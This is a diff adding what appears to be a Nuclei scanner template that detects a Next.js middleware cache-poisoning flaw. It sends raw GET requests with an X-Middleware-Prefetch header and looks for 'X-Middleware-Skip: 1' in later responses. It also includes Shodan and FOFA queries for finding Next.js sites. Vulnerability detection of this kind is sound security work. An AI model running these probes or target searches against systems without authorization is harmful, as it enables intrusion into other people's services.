@@ -1,0 +1,68 @@
+id: nextjs-middleware-cache-v2
+
+info:
+  name: Next.js - Middleware Cache Poisoning
+  author: DhiyaneshDk, coffin, sethbdev
+  severity: high
+  description: |
+    Detects cache poisoning vulnerability in Next.js using the X-Middleware-Prefetch header.
+  reference:
+    - https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole
+  tags: nextjs, cache-poisoning, middleware, cache, vercel, nodejs
+  metadata:
+    verified: true
+    vendor: vercel
+    product: next.js
+    framework: node.js
+    shodan-query: http.html:"/_next/static"
+    fofa-query: body="/_next/static"
+    cvss-score: 7.5
+    cwe-id: CWE-1021
+
+variables:
+  rand: "{{rand_text_numeric(5)}}"
+
+http:
+  - raw:
+      - |
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Middleware-Prefetch: 1
+        Priority: u=1
+        Accept: */*
+        User-Agent: Mozilla/5.0
+        Connection: close
+
+      - |
+        @timeout: 10s
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Middleware-Prefetch: 1
+        Priority: u=1
+        Accept: */*
+        User-Agent: Mozilla/5.0
+        Connection: close
+
+      - |
+        @timeout: 10s
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Mozilla/5.0
+        Connection: close
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains(all_headers_2, 'X-Middleware-Skip: 1')"
+          - "status_code_3 == 200 && contains(all_headers_3, 'X-Middleware-Skip: 1')"
+        condition: and
+
+    extractors:
+      - type: regex
+        part: header
+        name: middleware-skip
+        regex:
+          - "X-Middleware-Skip:\\s?1"
